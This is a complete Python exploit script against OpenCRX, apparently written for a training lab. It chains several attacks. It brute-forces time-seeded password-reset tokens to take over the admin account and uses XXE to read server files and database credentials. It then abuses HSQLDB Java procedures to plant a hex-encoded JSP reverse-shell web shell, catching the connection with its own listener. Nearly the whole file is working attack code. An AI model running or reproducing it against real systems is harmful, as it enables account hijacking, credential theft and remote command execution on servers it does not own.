#!/usr/bin/python3
import requests as r, sys, jaydebeapi, time, calendar, javarandom as jr, datetime, delorean, binascii, threading, zipfile, os
from http.server import HTTPServer, BaseHTTPRequestHandler
dbcreds = []
req = r.session()

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/javascript")
        self.end_headers()

    def _html(self, message):
        content = '<!ENTITY xxe "%aa;%bb;%cc;">'
        return content.encode("utf8")

    def do_GET(self):
        self._set_headers()
        self.wfile.write(self._html("hi!"))

def run(server_class=HTTPServer, handler_class=S, addr="localhost", port="8000"):
    server_address = (addr, port)
    httpd = server_class(server_address, handler_class)
    httpd.handle_request()

def websrv(lhost, lport):
	run(addr=str(lhost), port=int(lport))

def resetPass(user):
	string = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
	print("[+] Sending password reset request to user: {}".format(user))
	start = int(delorean.Delorean(datetime.datetime.utcnow(), timezone="UTC").epoch*1000)
	req.post("http://{}:{}/opencrx-core-CRX/RequestPasswordReset.jsp".format(rhost,rport), data={"id":user})
	end = int(delorean.Delorean(datetime.datetime.utcnow(), timezone="UTC").epoch*1000)
	rng = range(start,end)
	print("[+] Password reset request is successfully sent. Epoch range: {}-{}".format(start,end))
	z=""
	list = []
	successmessage = "Password successfully changed for "
	print("[+] Brute-forcing reset token...")
	for n in rng:
		r = jr.Random(n)
		for i in range(40):
			z = z + string[r.nextInt(62)]
		list.append(z)
		z=""
	for l in list:
		t = req.post("http://{}:{}/opencrx-core-CRX/PasswordResetConfirm.jsp".format(rhost,rport), data={"t":l,"p":"CRX","s":"Standard","id":user,"password1":"h@ck3D!!!","password2":"h@ck3D!!!"})
		if successmessage in t.text:
			print("[+] Password reset successfull with token: {}\n[+] Your new password: h@ck3D!!!".format(l))
			break
		

def getFile(file):
	print("[+] Trying to gather content of file: "+file)
	xml = """<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % aa "<![CDATA[">
<!ENTITY % bb SYSTEM "netdoc:{}" ><!ENTITY % cc "]]>">
<!ENTITY % file SYSTEM "http://{}:{}/file.dtd" > %file;]>
<org.opencrx.kernel.account1.Contact>
<lastName>XXE</lastName><firstName>STARTQQ &xxe; ENDQQ</firstName>
</org.opencrx.kernel.account1.Contact>""".format(file,lhost,webport)
	output = req.post("http://{}:{}/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account".format(rhost,rport), headers={"Accept":"application/xml", "Content-Type":"application/xml", "Authorization":"Basic YWRtaW4tU3RhbmRhcmQ6aEBjazNEISEh"}, data=xml)
	text = output.text[output.text.index('STARTQQ ')+len('STARTQQ '):output.text.index("\n ENDQQ")]
	print("[+] Content: "+text)
	return text

def dumpDBcreds():
	time.sleep(5)
	for i in getFile("/home/student/crx/data/hsqldb/dbmanager.sh").split("\n"):
		if "password" in i:
			x = i.split(" ")
			dbcreds.append(x[int(x.index("--url"))+1].replace("127.0.0.1",rhost))
			dbcreds.append(x[int(x.index("--user"))+1])
			dbcreds.append(x[int(x.index("--password"))+1])

import socket, time, sys, os
def listen(ip,port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, int(port)))
	s.listen(1)
	print("[+] Reverse shell listening on port " + str(port))
	conn, addr = s.accept()
	print('[+] Connection received from ',addr)
	conn.send("echo ' '\n".encode())
	conn.recv(8192).decode()
	conn.send("python3 -c 'import pty; pty.spawn(\"/bin/bash\");'\n".encode())
	sys.stdout.write(conn.recv(8192).decode())
	while True:
		command = input()
		if command == "exit":
			conn.send("exit\n\exit\n".encode())
			conn.recv(8192).decode()
			conn.close()
			sys.exit()
		#Send command
		command += "\n"
		conn.send(command.encode())
		time.sleep(0.5)
		sys.stdout.write("\033[A" + conn.recv(8192).decode())

def genPayload(ip, port):
	jsp = """<%@page import="java.lang.*,java.util.*,java.io.*,java.net.*"%>
<% class SC extends Thread{{InputStream k5;OutputStream p0;SC(InputStream k5,OutputStream p0){{this.k5=k5;this.p0=p0;}}
    public void run(){{BufferedReader gK=null;BufferedWriter cSI=null;
    try{{
        gK=new BufferedReader(new InputStreamReader(this.k5)); cSI=new BufferedWriter(new OutputStreamWriter(this.p0)); char buffer[]=new char[8192]; int lg;
        while((lg = gK.read(buffer,0,buffer.length))>0 ){{
          cSI.write(buffer,0,lg); cSI.flush();}}}} catch(Exception e){{}}
      try{{
        if(gK!=null)
          gK.close();
        if(cSI!=null)
          cSI.close();
      }} catch(Exception e){{}}
    }}
  }}try{{
    Socket socket = new Socket("{}",{}); Process process = Runtime.getRuntime().exec("/bin/bash");
    (new SC(process.getInputStream(),socket.getOutputStream())).start();(new SC(socket.getInputStream(),process.getOutputStream())).start();
  }} catch(Exception e) {{}}%>""".format(ip,port)
	return binascii.hexlify(bytes(jsp,'utf-8')).decode()
def dbexploit(url, user, passwd):
	print("[+] Starting exploitation for RCE...")
	driver = "org.hsqldb.jdbcDriver"
	print("[+] Downloading hsqldb to working directory...")
	hsqldbzip = r.get("http://altushost-swe.dl.sourceforge.net/project/hsqldb/hsqldb/hsqldb_2_7/hsqldb-2.7.1.zip")
	open('hsqldb.zip', 'wb').write(hsqldbzip.content)
	hsqldb = zipfile.ZipFile("hsqldb.zip")
	hsqldb.extractall('.')
	hsqldb.close()
	os.remove("hsqldb.zip")
	path = "./hsqldb-2.7.1/hsqldb/lib/hsqldb.jar"
	payload = genPayload(lhost,str(lport))
	print("[+] Payload is generated successfully. Connecting to HSQLDB...")
	conn = jaydebeapi.connect(driver,url,[user,passwd],path)
	curs = conn.cursor()
	curs.execute("CREATE FUNCTION getsystemproperty(IN key VARCHAR) RETURNS VARCHAR LANGUAGE JAVA\nDETERMINISTIC NO SQL\nEXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'")
	curs.execute("VALUES(getsystemproperty('user.home'))")
	userhome = curs.fetchone()[0]
	print("[+] Fetched user home for 2nd stage: "+userhome)
	curs.execute("CREATE PROCEDURE writetofile(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))\nLANGUAGE\nJAVA DETERMINISTIC NO SQL EXTERNAL NAME\n'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'")
	print("[+] Trying to upload malicious file to remote system...")
	curs.execute("call writetofile('"+userhome+"/crx/apache-tomee-plus-7.0.5/webapps/docs/h4x.jsp', cast ('"+payload+"' AS VARBINARY(1024)))".format())
	req.get("http://"+rhost+":"+rport+"/docs/h4x.jsp")

if __name__ == "__main__":
	if len(sys.argv) != 6:
		print("(+) usage: {} <RHOST> <RPORT> <LHOST> <LPORT> <WEBPORT>\n".format(sys.argv[0]))
		print("(+) RHOST - Remote server which runs vulnerable version of OpenCRX")
		print("(+) RPORT - Remote application port")
		print("(+) LHOST - Local IP Address to get shell")
		print("(+) LPORT - Local Port to get shell")
		print("(+) WEBPORT - Local Port for websrv\n")
		sys.exit(-1)
	rhost = sys.argv[1]
	rport = sys.argv[2]
	lhost = sys.argv[3]
	lport = sys.argv[4]
	webport = sys.argv[5]
	websrv_thread = threading.Thread(target=websrv, args=(lhost, webport))
	listener_thread = threading.Thread(target=listen, args=(lhost, lport))
	websrv_thread.start()
	resetPass("admin-Standard")
	dumpDBcreds()
	listener_thread.start()
	dbexploit(dbcreds[0],dbcreds[1],dbcreds[2])
	listener_thread.join()
